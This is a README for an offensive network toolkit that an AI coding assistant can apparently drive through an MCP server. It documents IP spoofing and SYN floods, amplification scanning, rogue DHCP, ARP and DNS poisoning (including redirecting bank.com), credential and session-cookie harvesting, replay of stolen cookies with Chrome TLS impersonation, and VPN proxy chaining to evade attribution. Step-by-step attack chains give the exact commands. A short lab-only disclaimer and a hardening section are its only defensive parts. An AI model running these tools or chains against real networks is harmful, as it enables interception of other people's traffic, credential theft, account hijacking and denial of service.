# ClaudeCodeIPTool v4.0

Complete IP spoofing, session replay, and proxy routing suite for VDT (Vulnerability Discovery Testing). **11 functional tools** covering reconnaissance, Layer 2/3/DHCP MITM, Chrome TLS impersonation, SOCKS5 routing, credential capture, and defense detection.

**New in v4.0:** DHCP spoofing (RFC 2131 4-way handshake), gratuitous ARP, bidirectional ARP poisoning.

---

## Tools

### Reconnaissance

#### 1. `lan-discovery.py` - Automated Network Reconnaissance
Discover and profile attack targets before exploitation:
- ARP scan for live host discovery
- Port scanning on common services
- OS fingerprinting via TTL analysis
- Attack target suggestions with tool recommendations

```bash
sudo python3 lan-discovery.py --suggest
sudo python3 lan-discovery.py --full --output lan-hosts.json
```

**Status**: ✓ Functional

---

### Offensive - Layer 3 (Internet-Wide)

#### 2. `spoofer.py` - Core IP Spoofing Primitives
One-way spoofing demonstrations (no responses received):
- TCP SYN flood with forged source IP
- UDP amplification (reflection attacks)
- ICMP redirect spoofing
- Decoy scanning (Nmap -D style)
- TTL manipulation for detection evasion

```bash
sudo python3 spoofer.py demo 192.168.1.1
```

**Status**: ✓ Functional (requires root/sudo)

#### 3. `spoof-scanner.py` - Reflection/Amplification Reconnaissance
Identify DDoS amplification vectors:
- Scans 8 reflection services (DNS, NTP, SNMP, Memcached, CharGen, SSDP, LDAP, HTTP)
- Reports amplification factors (Memcached 51,000x, NTP 556x, CharGen 358x)
- Tests BCP 38 / uRPF anti-spoofing controls
- JSON export

```bash
sudo python3 spoof-scanner.py scan --targets 8.8.8.8 --spoof 1.1.1.1
sudo python3 spoof-scanner.py test-bcp38 192.168.1.1 --victim 8.8.8.8
```

**Status**: ✓ Functional (tested against controlled targets)

#### 4. `ghostport.py` - Stealth Port Scanner via Spoofing
Port scanning without your IP touching the target:
- 4 inference methods: passive sniffing, timing side-channel, TTL differential, covert channels
- Target logs show victim IP, not attacker
- Attribution evasion demonstration

```bash
sudo python3 ghostport.py scan 192.168.1.100 --victim 8.8.8.8 --ports 80,443,22 --method passive
```

**Status**: ✓ Functional (requires 3-host setup or sniffing capability)

---

### Offensive - Layer 2/3 MITM (LAN)

#### 5. `dhcp-spoof.py` - DHCP 4-Way Handshake Spoofing
Rogue DHCP server implementing RFC 2131 - redirect routing/DNS at network config layer:
- Complete DISCOVER → OFFER → REQUEST → ACK handshake
- **Gateway mode**: become default route, intercept all traffic
- **DNS mode**: poison DNS only, keep real gateway
- **Isolate mode**: provide invalid gateway (DoS)

```bash
# Full MITM via gateway redirection
sudo python3 dhcp-spoof.py --mode gateway -v

# DNS poisoning only
sudo python3 dhcp-spoof.py --mode dns

# Network isolation DoS
sudo python3 dhcp-spoof.py --mode isolate
```

**Status**: ✓ Functional (requires root/sudo)

**RFC 2131 Options used:**
- Option 3 (router): Gateway redirection
- Option 6 (name_server): DNS poisoning
- Option 51 (lease_time): Attack persistence
- Options 58/59 (T1=T/2, T2=7T/8): Renewal timing

#### 6. `arp-spoof.py` - ARP Cache Poisoning (Layer 2)
True bidirectional spoofing via ARP cache manipulation:
- Standard ARP poisoning (op=2 reply)
- Gratuitous ARP for 3x faster cache updates (psrc=pdst broadcast)
- Bidirectional mode: poison both target and gateway simultaneously
- MITM traffic interception mode
- Auto IP forwarding enable/disable + clean restore on exit

```bash
# Basic ARP spoofing
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1

# With traffic interception
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1 --intercept

# Restore ARP cache
sudo python3 arp-spoof.py restore 192.168.1.100 --spoof-ip 192.168.1.1
```

**Status**: ✓ Functional (requires Layer 2 adjacency)

#### 7. `dns-spoof.py` - DNS Response Injection
Intercept DNS queries and return forged responses:
- Transaction ID matching (prevents rejected responses)
- Redirect specific domains or wildcard all traffic
- Real-time DNS injection

```bash
sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50
sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
```

**Status**: ✓ Functional (most effective with ARP spoofing active)

#### 8. `mitm-suite.py` - Credential Capture & Session Hijacking
Harvest traffic intercepted via ARP/DHCP spoofing:
- HTTP Basic Auth credential extraction
- POST form login data capture
- Session cookie hijacking
- SSL strip opportunity detection

```bash
sudo python3 mitm-suite.py -v
```

**Status**: ✓ Functional (requires ARP or DHCP spoofing active)

---

### Defensive

#### 9. `defense-detector.py` - Spoofing Attack Detection
Detect ARP/DNS attacks on your own network:
- ARP spoof detection (MAC change monitoring per IP)
- DNS spoof detection (response IP inconsistency tracking)
- Attacker MAC identification for blocking

```bash
sudo python3 defense-detector.py arp -v
sudo python3 defense-detector.py dns -v
```

**Status**: ✓ Functional

---

### Session Routing

#### 10. `session_replay.py` - Cookie Session Replay with Chrome TLS Impersonation
Replay captured browser sessions with proper TLS fingerprinting:
- `curl_cffi` mimics Chrome's exact JA3/JA3s/ALPN fingerprint
- Reads Netscape-format cookie files
- Bypasses TLS fingerprint detection (Google, Cloudflare, etc.)
- Modes: `probe`, `enumerate`, `export`

```bash
pip install curl_cffi
python3 session_replay.py probe --cookies cookies.txt --url https://admin.example.com/
python3 session_replay.py enumerate --cookies cookies.txt --domains targets.txt --output results.json
python3 session_replay.py test-tls --url https://tls.browserleaks.com/tls
```

**Status**: ✓ Functional (requires `pip install curl_cffi`)

#### 11. `windscribe_socks.py` - SOCKS5 Proxy + Chrome TLS Chain
Channel sessions through VPN exit IPs:
- Routes `curl_cffi` sessions through Windscribe SOCKS5 (localhost:1080)
- Shows exit IP and ASN before/after for routing confirmation
- Full chain: proxy + TLS impersonation + session cookies

```bash
python3 windscribe_socks.py status
python3 windscribe_socks.py chain --cookies cookies.txt --url https://admin.example.com/ --output result.html
python3 windscribe_socks.py probe https://ipinfo.io/json
```

**Status**: ✓ Functional (requires Windscribe connected + `pip install curl_cffi`)

---

## Setup

```bash
pip install scapy curl_cffi
python3 -c "from scapy.all import *; print('Scapy OK')"
```

---

## Attack Chains

### Chain 1: DHCP MITM (Stealthy, Network-Wide)

```bash
# Terminal 1: Start rogue DHCP server
sudo python3 dhcp-spoof.py --mode gateway -v

# Wait for target DHCP renewal (or force: sudo dhclient -r && sudo dhclient)
# Target now routes all traffic through you

# Terminal 2: Capture credentials
sudo python3 mitm-suite.py -v
```

Best for: new clients joining the network, no continuous poisoning needed.

### Chain 2: ARP MITM (Immediate, Per-Target)

```bash
# Terminal 1: Discover targets
sudo python3 lan-discovery.py --suggest

# Terminal 2: ARP poison (target ↔ gateway)
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1 --intercept

# Terminal 3: DNS redirect (optional)
sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50

# Terminal 4: Capture credentials
sudo python3 mitm-suite.py -v
```

Best for: immediate interception of existing sessions.

### Chain 3: DHCP + DNS (Dual-Layer Poisoning)

```bash
# Rogue DHCP pushes attacker DNS (Option 6)
sudo python3 dhcp-spoof.py --mode dns -v

# Once client renews, their DNS points to you
# All DNS queries now come to your machine
sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
```

---

## Capability Matrix

| Tool | Spoofing Type | Scope | Persistence | Requires LAN |
|------|--------------|-------|-------------|--------------|
| spoofer.py | L3 one-way | Internet | Single shot | No |
| spoof-scanner.py | L3 one-way | Internet | Single shot | No |
| ghostport.py | L3 one-way | Internet | Single shot | No |
| dhcp-spoof.py | Network config | Subnet | Lease duration | Yes |
| arp-spoof.py | L2 bidirectional | LAN | Until stopped | Yes |
| dns-spoof.py | DNS injection | LAN | Until stopped | Yes |
| mitm-suite.py | Passive capture | LAN | Until stopped | Yes |

---

## Requirements

**Raw socket access** (root/sudo required for all MITM/spoofing tools)

**BCP 38 / uRPF status** affects Layer 3 one-way spoofing:
- Cloud providers (AWS, GCP, Azure): block spoofed packets
- Dedicated servers (Hetzner, OVH): typically allow
- Home ISPs: typically allow (test on owned infrastructure only)

**DHCP and ARP tools** are not affected by BCP 38 (operate at L2).

---

## VDT Baseline v2.1

**CONTROLLED ENVIRONMENT ONLY**

- Active exploitation: owned/mirror targets only
- Enumeration: live 3rd-party for metadata/recon only
- These tools: exploitation only against controlled targets

✓ Own infrastructure BCP 38 testing  
✓ Owned lab MITM research  
✓ Educational demonstrations on controlled networks  
✗ Unauthorized networks  
✗ DDoS abuse  

---

## Defensive Hardening

**Against DHCP spoofing:** Enable DHCP snooping on managed switches; use static IPs.

**Against ARP spoofing:** Dynamic ARP Inspection (DAI); static ARP entries for gateways.

**Against DNS spoofing:** DNSSEC; encrypted DNS (DoH/DoT).

**Against IP spoofing (BCP 38):**
```bash
# Cisco - uRPF strict mode
interface GigabitEthernet0/0
 ip verify unicast source reachable-via rx

# Linux iptables
iptables -t raw -A PREROUTING -m rpfilter --invert -j DROP
```

**Detection via TTL analysis:**
```python
# See spoofer.py SpoofDetector class
detector = SpoofDetector(threshold=5)
detector.analyze(src_ip='8.8.8.8', observed_ttl=13)
```

---

## O'Reilly Research Corpus (16 books, 300+ chapters)

**Protocol Internals:**
- TCP/IP Illustrated Vol 1 Ch4 - ARP cache timing (20 min/3 min), gratuitous ARP
- TCP/IP Illustrated Vol 1 Ch6 - DHCP handshake, Options 3/6/51/58/59
- TCP/IP Illustrated Vol 1 Ch11 - DNS transaction ID matching

**Attack Techniques:**
- Python for Security Ch5 - Scapy layer stacking, send()/sr()/sendp()
- Violent Python Ch4 - TTL-based detection (H.D. Moore technique)
- Attacking Network Protocols Ch7/Ch10 - Protocol weaknesses, exploitation

**Advanced Topics (synthesis pending):**
- IPv6 Security - NDP poisoning, Router Advertisement spoofing
- Learning eBPF - XDP/TC-BPF kernel-level packet manipulation
- Practical IoT Hacking - mDNS/LLMNR/NBT-NS/CoAP/MQTT
- Network Programmability - Netlink, NFQUEUE, namespace exploitation
- Industrial Network Security (3 editions) - ICS/OT Modbus/DNP3/EtherNet-IP
- Kubernetes Security - Container network namespace escapes
- WebSocket / Programming WebRTC - Real-time bidirectional hijacking
- Network Security Bible / Networking Bible - Protocol internals
- Network Intrusion Detection - IDS evasion techniques

---

## MCP Integration

Natural language interface via Claude Code MCP server:

```bash
# Configured at ~/.claude/mcp-servers/ClaudeCodeIPTool/server.py
# Available tools:
# - spoof_reflection_scan
# - spoof_ghostport_scan
# - spoof_test_bcp38
# - spoof_detect_ttl
# - spoof_list_services
```
